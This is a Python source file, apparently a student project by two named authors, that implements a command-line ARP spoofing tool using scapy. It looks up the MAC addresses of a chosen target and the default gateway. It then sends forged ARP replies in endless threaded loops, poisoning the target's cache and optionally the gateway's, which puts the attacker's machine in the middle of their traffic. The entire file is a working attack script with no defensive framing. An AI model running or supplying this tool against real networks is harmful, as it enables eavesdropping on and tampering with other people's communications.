# Avi Feder && Daniel Yochanan
from arp_table import ARPTABLE
import argparse
from time import sleep
from scapy.all import *
from scapy.layers.l2 import ARP, Ether


def get_mac(ip_address, interface):
    my_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip_address)
    return srp1(my_packet, verbose=0, iface=interface).hwsrc


def arp_poisoning(target_mac, target_ip, fake_mac, fake_ip, delay, interface):
    while True:
        my_packet = Ether(dst=target_mac) / ARP(op=2, hwsrc=fake_mac, psrc=fake_ip, hwdst=target_mac,
                                                pdst=target_ip)
        sendp(my_packet, verbose=0, iface=interface)
        sleep(delay)


def main():
    parser = argparse.ArgumentParser(description="Arpspoofer. by Daniel Yochanan and Avi Feder")
    parser.add_argument("-i", "--IFACE", type=str, metavar='', help="Interface you wish to use")
    parser.add_argument("-s", "--SRC", type=str, metavar='', help="The address you want for the attacker")
    parser.add_argument("-d", "--DELAY", type=float, metavar='', help="Delay (in seconds) between messages")
    parser.add_argument("-gw", "--GATEWAY", type=bool, metavar='', help="should GW be attacked as well?")
    parser.add_argument("-t", "--TARGET", type=str, metavar='', required=True, help="IP of target")
    args = parser.parse_args()

    target_ip = args.TARGET
    interface = args.IFACE if (args.IFACE is not None) else conf.iface
    hacker_mac = get_if_hwaddr(interface)
    delay = args.DELAY if (args.DELAY is not None) else 0.1
    target_mac = get_mac(target_ip, interface)
    default_gateway_ip = conf.route.route("0.0.0.0")[2]
    default_gateway_mac = get_mac(default_gateway_ip, interface)
    src = args.SRC if (args.SRC is not None) else default_gateway_ip

    threading.Thread(target=arp_poisoning,
                     args=(target_mac, target_ip, hacker_mac, src, delay, interface,)).start()

    if args.GATEWAY:
        threading.Thread(target=arp_poisoning,
                         args=(
                         default_gateway_mac, default_gateway_ip, hacker_mac, target_ip, delay, interface)).start()


if __name__ == '__main__':
    main()
